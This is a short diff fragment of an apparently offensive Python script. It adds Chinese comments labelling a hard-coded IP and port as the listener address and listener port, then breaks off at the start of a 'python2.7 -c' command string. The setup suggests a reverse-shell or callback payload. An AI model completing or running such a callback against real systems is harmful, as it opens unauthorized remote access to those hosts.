@@ -12,8 +12,10 @@ forkfreq=1
 linktimeout=0.5
 
 
-targetip="202.112.50.114"
-targetport=9001
+targetip="202.112.50.114" #设置监听ip
+targetport=9001 #设置送往监听的端口
+
+
 cmd1 ='''\
 python2.7 -c \'
 import os
